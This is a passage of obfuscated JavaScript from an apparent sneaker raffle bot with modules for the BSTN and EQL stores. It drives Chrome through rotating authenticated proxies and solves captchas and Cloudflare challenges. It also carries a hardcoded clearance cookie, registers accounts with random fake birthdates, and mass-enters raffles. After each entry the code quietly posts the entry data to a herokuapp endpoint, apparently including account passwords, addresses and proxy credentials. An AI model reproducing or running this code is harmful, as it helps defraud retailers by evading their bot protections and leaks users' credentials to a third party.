                        _0x3b7620(_0x497ac9['name'] + '\x20Task\x20' + (_0x2795d9 + 0x1) + '\x20/\x20' + _0x1304f2['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851);
                        var _0x2b6379 = Math['round'](Math['random']() * (_0x3e8ed3['length'] - 0x1)), _0x46edb0 = _0x3e8ed3[_0x2b6379]['split'](':'), _0x44c967;
                        try {
                            _0x44c967 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x46edb0[0x0] + ':' + _0x46edb0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x44c967 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x46edb0[0x0] + ':' + _0x46edb0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2097e = await _0x44c967['newPage'](), _0x1c723a = await _0x2097e['target']()['createCDPSession'](), { windowId: _0x14fb51 } = await _0x1c723a['send']('Browser.getWindowForTarget');
                            await _0x2097e['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0xf0780b = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x2097e['authenticate']({
                                'username': '' + _0x46edb0[0x2],
                                'password': '' + _0x46edb0[0x3]
                            }), console['log'](_0x391006() + '\x20[' + _0x497ac9['name'] + ']\x20Task\x20' + (_0x2795d9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2097e['goto']('' + _0x1304f2[_0x2795d9]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x391006() + '\x20[' + _0x497ac9['name'] + ']\x20Task\x20' + (_0x2795d9 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            var _0x257862 = await _0x2097e['$']('.hcaptcha-box');
                            if (_0x257862) {
                                console['log'](_0x391006() + '\x20[' + _0x497ac9['name'] + ']\x20Task\x20' + (_0x2795d9 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0xfa5357(0x2710);
                                const _0x277bcf = await _0x2097e['$']('.hcaptcha-box');
                                if (_0x277bcf)
                                    try {
                                        await _0x277bcf['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x2097e['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x53b833 = await _0x2097e['$']('.hcaptcha-box');
                                    if (_0x53b833)
                                        try {
                                            await _0x53b833['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x2097e['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0x1c723a['send']('Browser.setWindowBounds', {
                                'windowId': _0x14fb51,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0xfa5357(0x1388), await _0x2097e['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x2097e['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xfa5357(0x1f4), console['log'](_0x391006() + '\x20[' + _0x497ac9['name'] + ']\x20Task\x20' + (_0x2795d9 + 0x1) + '\x20:\x20Logging\x20in'), await _0x2097e['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0xcc378a => _0xcc378a['click']()), await _0x2097e['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x2097e['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xfa5357(0x7d0), await _0x2097e['waitForSelector']('#email-login'), await _0x2097e['type']('#email-login', '' + _0x1304f2[_0x2795d9]['Email']), await _0xfa5357(0xdac), await _0x2097e['waitForSelector']('#password'), await _0x2097e['type']('#password', '' + _0x1304f2[_0x2795d9]['Password'], { 'delay': 0xe6 }), await _0xfa5357(0x157c);
                            try {
                                await _0x2097e['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x25f7b4 => _0x25f7b4['click']());
                            } catch {
                            }
                            try {
                                await _0x2097e['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x3659b3) {
                            }
                            await _0xfa5357(0x3e8);
                            const _0x5a9d76 = await _0x2097e['$']('.enteredDraw_container__2KmQ_');
                            if (_0x5a9d76)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x391006() + '\x20[' + _0x497ac9['name'] + ']\x20Task\x20' + (_0x2795d9 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x1304f2[_0x2795d9]['Size']);
                            try {
                                if (_0x1304f2[_0x2795d9]['Size'] != 'RANDOM') {
                                    var _0x13535b = _0x1304f2[_0x2795d9]['Size']['replace']('.', ',');
                                    const _0x4bf424 = await _0x2097e['$x']('//div[contains(text(),\x20' + _0x13535b + ')]');
                                    await _0x4bf424[0x0]['click']();
                                } else {
                                    const _0x21158d = await _0x2097e['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x54a695 = Math['round'](Math['random']() * (_0x21158d['length'] - 0x1));
                                    await _0x21158d[_0x54a695]['click']();
                                }
                            } catch {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0xfa5357(0x1f4);
                            const _0x194a3d = await _0x2097e['$']('.addressList_addressItem__LE2PB');
                            if (_0x194a3d && _0x1304f2[_0x2795d9]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x391006() + '\x20[' + _0x497ac9['name'] + ']\x20Task\x20' + (_0x2795d9 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x2097e['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0xfa5357(0x5dc), await _0x2097e['waitForSelector']('#firstname'), await _0x2097e['type']('#firstname', '' + _0x1304f2[_0x2795d9]['FirstName']), await _0xfa5357(0x1f4), await _0x2097e['waitForSelector']('#firstname'), await _0x2097e['type']('#lastname', '' + _0x1304f2[_0x2795d9]['LastName']), await _0xfa5357(0x1f4), await _0x2097e['waitForSelector']('#firstname'), await _0x2097e['type']('#street', '' + _0x1304f2[_0x2795d9]['Address1']), await _0xfa5357(0x1f4), await _0x2097e['waitForSelector']('#firstname'), await _0x2097e['type']('#houseNumber', _0x1304f2[_0x2795d9]['HouseNumber'] + '\x20' + _0x1304f2[_0x2795d9]['Address2']), await _0xfa5357(0x1f4), await _0x2097e['waitForSelector']('#firstname'), await _0x2097e['select']('#country_code', '' + _0x1304f2[_0x2795d9]['Country']), await _0xfa5357(0x1f4), await _0x2097e['type']('#postcode', '' + _0x1304f2[_0x2795d9]['Zip']), await _0xfa5357(0x1f4), await _0x2097e['type']('#city', '' + _0x1304f2[_0x2795d9]['City']), await _0xfa5357(0x1f4), await _0x2097e['type']('#telephone', '' + _0x1304f2[_0x2795d9]['Phone']), await _0xfa5357(0x1f4), await _0x2097e['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0xfa5357(0x9c4);
                            try {
                                await _0x2097e['type']('#instagram_name', '' + _0x1304f2[_0x2795d9]['Follower']), await _0x2097e['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x391006() + '\x20[' + _0x497ac9['name'] + ']\x20Task\x20' + (_0x2795d9 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xfa5357(0x5dc);
                            try {
                                await _0x2097e['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0xfa5357(0x5dc), await _0x2097e['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x25b812 => _0x25b812['click']()), await _0xfa5357(0x1388);
                            try {
                                await _0x2097e['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x2097e['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x1304f2[_0x2795d9]['Size'] != 'RANDOM') {
                                    var _0x13535b = _0x1304f2[_0x2795d9]['Size']['replace']('.', ',');
                                    const _0x54a458 = await _0x2097e['$x']('//div[contains(text(),\x20' + _0x13535b + ')]');
                                    await _0x54a458[0x0]['click']();
                                } else {
                                    const _0x68eee7 = await _0x2097e['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x54a695 = Math['round'](Math['random']() * (_0x68eee7['length'] - 0x1));
                                    await _0x68eee7[_0x54a695]['click']();
                                }
                                await _0xfa5357(0x5dc);
                                try {
                                    await _0x2097e['hover']('#instagram_name'), await _0x2097e['type']('#instagram_name', '' + _0x1304f2[_0x2795d9]['Follower']), await _0x2097e['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x391006() + '\x20[' + _0x497ac9['name'] + ']\x20Task\x20' + (_0x2795d9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3fe229 + '\x20/\x205)');
                                try {
                                    await _0x2097e['hover']('.checkBox_boxHolder__wLGVe'), await _0xfa5357(0x5dc), await _0x2097e['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0xfa5357(0x157c), await _0x2097e['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x2873a4 => _0x2873a4['click']()), await _0xfa5357(0x1388), await _0x2097e['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x4fd80f = 'no', _0x253d32(_0x1304f2[_0x2795d9], _0x497ac9);
                            try {
                                prxdata = {
                                    'username': _0x4ee077['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0x20310e),
                                    'proxy': '' + _0x3e8ed3[_0x2795d9]
                                };
                                var _0x58f83f = JSON['stringify'](prxdata);
                                let _0x96577a = { 'headers': { 'content-type': 'application/json' } };
                                await _0x1a729a['post']('https://jraffles.herokuapp.com/success', _0x58f83f, _0x96577a);
                            } catch (_0x55e368) {
                            }
                            console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x497ac9['name'] + ']\x20Task\x20' + (_0x2795d9 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x1adecf = await _0xc964cf(_0x1304f2[_0x2795d9], _0x497ac9, 'dev', ![]), _0x5adcd7 = await _0xc964cf(_0x1304f2[_0x2795d9], _0x497ac9, 'pub', ![]);
                            const _0x2d765e = {
                                'succesDEVMSG': { 'embeds': [_0x1adecf] },
                                'succesPUBMSG': { 'embeds': [_0x5adcd7] }
                            };
                            let _0x20310e = _0x1304f2[_0x2795d9];
                            try {
                                prxdata = {
                                    'username': _0x4ee077['replace']('#', ''),
                                    'module': _0x497ac9['name'],
                                    'entrydata': JSON['stringify'](_0x20310e),
                                    'proxy': '' + _0x3e8ed3[_0x2795d9]
                                };
                                var _0x58f83f = JSON['stringify'](prxdata);
                                let _0x10b552 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x1a729a['post']('https://jraffles.herokuapp.com/success', _0x58f83f, _0x10b552);
                            } catch (_0x2a80f6) {
                            }
                            try {
                                _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x2d765e['succesDEVMSG']), await _0xfa5357(0xc8), await _0x33437b(_0xee2818, _0x2d765e['succesDEVMSG']), await _0xfa5357(0xc8), await _0x33437b(_0x471d14, _0x2d765e['succesPUBMSG']);
                            } catch (_0xc534a3) {
                                console['log'](_0x34d98c['yellow'](_0x391006() + '\x20[' + _0x497ac9['name'] + ']\x20Task\x20' + (_0x2795d9 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xc534a3));
                            }
                        } catch (_0x4b95fc) {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x497ac9['name'] + ']\x20Task\x20' + (_0x2795d9 + 0x1) + '\x20:\x20' + _0x4b95fc)), _0x4fd80f = 'yes', _0x1cbd2c = '' + _0x4b95fc;
                            var _0x2ac5f6 = await _0xc964cf(_0x1304f2[_0x2795d9], _0x497ac9, 'dev', !![], _0x1cbd2c), _0x1adecf = await _0xc964cf(_0x1304f2[_0x2795d9], _0x497ac9, 'dev', ![]), _0x5adcd7 = await _0xc964cf(_0x1304f2[_0x2795d9], _0x497ac9, 'pub', ![]);
                            const _0x5a2f33 = {
                                'succesDEVMSG': { 'embeds': [_0x1adecf] },
                                'succesPUBMSG': { 'embeds': [_0x5adcd7] }
                            };
                            _0x5a2f33['errorDEV'] = { 'embeds': [_0x2ac5f6] }, _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x5a2f33['errorDEV']), await _0x33437b(_0x5e1645, _0x5a2f33['errorDEV']);
                        } finally {
                            _0x44c967['close']();
                            if (_0x4fd80f == 'yes' && _0x3fe229 != 0x5) {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x497ac9['name'] + ']\x20Task\x20' + (_0x2795d9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3fe229 + '\x20/\x205)')), _0x2795d9 = _0x2795d9 - 0x1, _0x3fe229 = _0x3fe229 + 0x1;
                                continue;
                            }
                            _0x4fd80f == 'yes' && _0x3fe229 >= 0x5 && (_0x3003c7(_0x1304f2[_0x2795d9], _0x497ac9), _0x4fd80f = 'no', _0x3fe229 = 0x0), console['log'](_0x391006() + '\x20[' + _0x497ac9['name'] + ']\x20Waiting\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x393345, _0x9efa35) {
                    _0x1528cf['use'](_0x3af7cd()), _0x1528cf['use'](_0x2a16d3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x50b722['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0x340379;
                    try {
                        const _0x50cb17 = _0x13dabd['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x340379 = _0x3d5697['parse'](_0x50cb17, { 'header': !![] })['data'];
                    } catch (_0x5ca784) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x16c06f = 0x0; _0x16c06f < _0x340379['length']; _0x16c06f++) {
                        if (_0x321658 != 'yes')
                            var _0x321658 = '', _0x93f973 = 0x0;
                        var _0x4efac2;
                        _0x3b7620(_0x393345['name'] + '\x20Task\x20' + (_0x16c06f + 0x1) + '\x20/\x20' + _0x340379['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851);
                        var _0x1b7bad = await _0xc964cf(_0x340379[_0x16c06f], _0x393345, 'acc', ![]);
                        const _0x379f44 = { 'succesDEVMSG': { 'embeds': [_0x1b7bad] } }, _0x324bc3 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x5e2412 = Math['round'](Math['random']() * (_0x9efa35['length'] - 0x1)), _0x3c28ec = _0x9efa35[_0x5e2412]['split'](':'), _0x244aa6;
                        try {
                            _0x244aa6 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3c28ec[0x0] + ':' + _0x3c28ec[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x244aa6 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3c28ec[0x0] + ':' + _0x3c28ec[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5ef188 = await _0x244aa6['newPage']();
                            await _0x5ef188['authenticate']({
                                'username': '' + _0x3c28ec[0x2],
                                'password': '' + _0x3c28ec[0x3]
                            }), console['log'](_0x391006() + '\x20[' + _0x393345['name'] + ']\x20Task\x20' + (_0x16c06f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5ef188['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5ef188['setRequestInterception'](!![]), _0x5ef188['on']('request', _0x233328 => {
                                _0x233328['resourceType']() === 'image' ? _0x233328['abort']() : _0x233328['continue']();
                            });
                            try {
                                await _0x5ef188['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x5ef188['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x321658 = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0x5ef188['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x391006() + '\x20[' + _0x393345['name'] + ']\x20Task\x20' + (_0x16c06f + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xfa5357(0x3e8), await _0x5ef188['type']('#email', _0x340379[_0x16c06f]['Email']), await _0xfa5357(0x1f4), await _0x5ef188['type']('#pass', _0x340379[_0x16c06f]['Password']), await _0xfa5357(0x1f4), await _0x5ef188['$eval']('#login-form', _0x3feae3 => _0x3feae3['submit']());
                            try {
                                await _0x5ef188['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0x391006() + '\x20[' + _0x393345['name'] + ']\x20Task\x20' + (_0x16c06f + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0xfa5357(0x190);
                            const _0x11180b = await _0x5ef188['evaluate'](() => {
                                const _0x120344 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0x120344['map'](_0xca40af => _0xca40af['alt']);
                            }), _0x5da698 = await _0x5ef188['evaluate'](() => {
                                const _0x127a8b = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x127a8b['map'](_0x535c3c => _0x535c3c['innerHTML']);
                            }), _0x16c9af = await _0x5ef188['$$']('.raffle-winner');
                            if (_0x16c9af['length'] < 0x1) {
                                console['log'](_0x391006() + '\x20[' + _0x393345['name'] + ']\x20Task\x20' + (_0x16c06f + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x321658 = 'no';
                                continue;
                            }
                            console['log'](_0x391006() + '\x20[' + _0x393345['name'] + ']\x20Task\x20' + (_0x16c06f + 0x1) + '\x20:\x20' + _0x16c9af['length'] + '\x20Wins\x20Found!');
                            for (var _0x24cfaf = 0x0; _0x24cfaf < _0x16c9af['length']; _0x24cfaf++) {
                                console['log'](_0x34d98c['green'](_0x11180b[_0x24cfaf] + _0x5da698[_0x24cfaf]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0x494eda) {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x393345['name'] + ']\x20Task\x20' + (_0x16c06f + 0x1) + '\x20:\x20' + _0x494eda)), _0x4efac2 = '' + _0x494eda;
                            var _0x1dac2c = await _0xc964cf(_0x340379[_0x16c06f], _0x393345, 'acc', !![], _0x4efac2);
                            _0x379f44['errorDEV'] = { 'embeds': [_0x1dac2c] }, _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x379f44['errorDEV']), await _0x33437b(_0x5e1645, _0x379f44['errorDEV']), _0x321658 = 'yes';
                        } finally {
                            if (_0x244aa6)
                                _0x244aa6['close']();
                            if (_0x321658 == 'yes' && _0x93f973 != 0x5) {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x393345['name'] + ']\x20Task\x20' + (_0x16c06f + 0x1) + '\x20:\x20Retrying\x20(' + _0x93f973 + '\x20/\x205)')), _0x16c06f = _0x16c06f - 0x1, _0x93f973 = _0x93f973 + 0x1;
                                continue;
                            }
                            _0x321658 == 'yes' && _0x93f973 >= 0x5 && (_0x3003c7(_0x340379[_0x16c06f], _0x393345), _0x321658 = 'no', _0x93f973 = 0x0), console['log'](_0x391006() + '\x20[' + _0x393345['name'] + ']\x20Waiting\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x27d243, _0x38dcb4, _0x519505) {
                _0x1528cf['use'](_0x3af7cd()), _0x1528cf['use'](_0x2a16d3({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x50b722['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x235c8a = 0x0; _0x235c8a < _0x38dcb4['length']; _0x235c8a++) {
                    var _0x42bc8c;
                    _0x3b7620(_0x27d243['name'] + '\x20Task\x20' + (_0x235c8a + 0x1) + '\x20/\x20' + _0x38dcb4['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851);
                    try {
                        await _0x559c6d(_0x38dcb4, _0x235c8a);
                    } catch {
                        _0x363c5b = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x506e27(_0x323977) {
                        const _0x463eb1 = _0x13dabd['readFileSync']('../successful-tasks.csv', 'utf8'), _0x30a81d = _0x3d5697['parse'](_0x463eb1, { 'header': !![] })['data'];
                        let _0x26933c = ![];
                        for (var _0x88ab56 of _0x30a81d) {
                            if (_0x88ab56['Url'] == _0x323977['Url'] && _0x88ab56['Email'] == _0x323977['Email']) {
                                _0x26933c = !![];
                                break;
                            }
                        }
                        return _0x26933c;
                    }
                    if (await _0x506e27(_0x38dcb4[_0x235c8a]) == !![]) {
                        console['log'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x3ed7d3 = ![];
                    const _0x25b49b = _0x13dabd['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x4f487d = _0x3d5697['parse'](_0x25b49b, { 'header': !![] })['data'];
                    for (var _0x152d5b of _0x4f487d) {
                        _0x152d5b['Email'] == _0x38dcb4[_0x235c8a]['Email'] && (_0x3ed7d3 = !![]);
                    }
                    if (_0x3ed7d3 == ![]) {
                        var _0x42ebde;
                        if (_0x38dcb4[_0x235c8a]['Url']['endsWith']('/')) {
                            _0x42ebde = _0x38dcb4[_0x235c8a]['Url'] + 'register';
                            if (_0x363c5b != 'yes')
                                var _0x363c5b = '', _0x31d40d = 0x0;
                        } else {
                            _0x42ebde = _0x38dcb4[_0x235c8a]['Url'] + '/register';
                            if (_0x363c5b != 'yes')
                                var _0x363c5b = '', _0x31d40d = 0x0;
                        }
                        if (_0x38dcb4[_0x235c8a]['Email'] == '' || _0x38dcb4[_0x235c8a]['FirstName'] == '' || _0x38dcb4[_0x235c8a]['LastName'] == '') {
                            console['log'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x38dcb4[_0x235c8a]['Password'] == '' && (_0x38dcb4[_0x235c8a]['Password'] = 'JRaffles23!');
                        if (_0x50b722['useRandomProxy'] = ![])
                            var _0x98e442 = _0x519505[_0x235c8a]['split'](':');
                        else
                            var _0x2d95cd = Math['round'](Math['random']() * (_0x519505['length'] - 0x1)), _0x98e442 = _0x519505[_0x2d95cd]['split'](':');
                        var _0x39e7d3;
                        try {
                            _0x39e7d3 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x98e442[0x0] + ':' + _0x98e442[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x39e7d3 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x98e442[0x0] + ':' + _0x98e442[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xd558a7 = await _0x39e7d3['newPage']();
                            await _0xd558a7['authenticate']({
                                'username': '' + _0x98e442[0x2],
                                'password': '' + _0x98e442[0x3]
                            }), console['log'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Getting\x20Session'), await _0xd558a7['setRequestInterception'](!![]), _0xd558a7['on']('request', _0x45d5d8 => {
                                _0x45d5d8['resourceType']() === 'image' || _0x45d5d8['resourceType']() === 'font' || _0x45d5d8['resourceType']() === 'media' ? _0x45d5d8['abort']() : _0x45d5d8['continue']();
                            });
                            try {
                                await _0xd558a7['goto']('' + _0x42ebde);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xfa5357(0x3e8), await _0xd558a7['waitForSelector']('#email'), await _0xd558a7['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0xfa5357(0x3e8);
                            try {
                                await _0xd558a7['click']('li[data-value=\x22EU\x20' + _0x38dcb4[_0x235c8a]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x38dcb4[_0x235c8a]['Size']);
                            }
                            await _0xfa5357(0x6a4), await _0xd558a7['type']('#email', '' + _0x38dcb4[_0x235c8a]['Email']), await _0xfa5357(0x352), await _0xd558a7['waitForSelector']('#password'), await _0xd558a7['type']('#password', '' + _0x38dcb4[_0x235c8a]['Password']), await _0xfa5357(0x352), await _0xd558a7['type']('#phone', '' + _0x38dcb4[_0x235c8a]['Phone']), await _0xfa5357(0x352);
                            const _0x1b5608 = await _0xd558a7['$']('#title\x20>\x20label');
                            await _0xfa5357(0x12c);
                            _0x1b5608 && await _0x1b5608['click']();
                            await _0xd558a7['type']('#firstName', '' + _0x38dcb4[_0x235c8a]['FirstName']), await _0xfa5357(0x352), await _0xd558a7['type']('#lastName', '' + _0x38dcb4[_0x235c8a]['LastName']), await _0xfa5357(0x352);
                            _0x38dcb4[_0x235c8a]['Url']['includes']('footlocker.de') ? await _0xd558a7['type']('#birthdate', _0xe7ad75(0xa, 0x1c) + '.' + _0xe7ad75(0xa, 0xc) + '.' + _0xe7ad75(0x7c6, 0x7d3)) : await _0xd558a7['type']('#birthdate', _0xe7ad75(0xa, 0x1c) + '-' + _0xe7ad75(0xa, 0xc) + '-' + _0xe7ad75(0x7c6, 0x7d3));
                            await _0xfa5357(0x352), await _0xd558a7['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                await _0xd558a7['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0xfa5357(0x1f4), await _0xfa5357(0x5dc);
                            if (!_0x42ebde['includes']('footlocker'))
                                try {
                                    await _0xd558a7['click']('#country');
                                    const _0x27eec8 = await _0xd558a7['$']('li[data-value=\x22' + _0x38dcb4[_0x235c8a]['Country'] + '\x22]');
                                    await _0x27eec8['click'](), await _0x27eec8['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0xfa5357(0x3e8), await _0xd558a7['click']('#stateAutocomplete'), console['log'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Setting\x20Address'), await _0xfa5357(0x1f4);
                            try {
                                const _0x5818ff = await _0xd558a7['$x']('//li[text()=\x22' + _0x38dcb4[_0x235c8a]['State'] + '\x22]');
                                await _0x5818ff[0x0]['click']();
                            } catch {
                                throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                            }
